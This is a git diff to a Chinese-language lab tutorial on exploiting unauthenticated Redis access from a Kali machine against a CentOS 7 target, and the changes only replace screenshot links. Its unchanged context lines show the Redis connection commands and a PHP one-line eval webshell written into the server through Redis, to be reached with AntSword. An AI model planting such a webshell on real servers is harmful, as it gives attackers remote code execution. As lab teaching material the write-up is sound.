@@ -86,19 +86,22 @@ systemctl start redis
 systemctl status redis
 ```
 如图即成功开启redis服务
-![](https://i-blog.csdnimg.cn/direct/3c6da71ff7cc43848cde4869d678e7fe.bmp#pic)
+![capture_20250426152750115](https://github.com/user-attachments/assets/b96d0b88-300a-4036-b026-dcbbd1c8263d)
+
 从靶机centos7上进入redis客户端服务
 ```
 redis-cli
 ```
 如图即成功进入
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a86e6097dd674abe92fe68a0eb15f940.bmp#pic)
+![capture_20250426153839832](https://github.com/user-attachments/assets/7c3596b0-6ef9-4503-af5c-44fb55011a5d)
+
 
 从攻击机kali上尝试连接靶机的redis服务
 ```
 redis-cli -h <靶机的IP地址> -p 6379
 ```
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3874d3188f844d6599d7e2f6fe4a9dd3.bmp#pic_)
+![capture_20250426154135989](https://github.com/user-attachments/assets/191f2d59-c349-4605-9aa3-54ad8b58f7a9)
+
 这样就说明整个漏洞环境搭建完成了
 ### 2.利用漏洞写入webshell
 前提:
@@ -122,7 +125,8 @@ set webshell "<?php @eval($_POST['pass']); ?>"
 save
 
 ```
-![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/632590f3d55c4f8db2aa602779968e8a.bmp#pic_left)
+![capture_20250426114349027](https://github.com/user-attachments/assets/7b96f887-0e51-44c7-8eeb-36b4938f0011)
+
 
 然后就可以在蚁剑上连接了
 
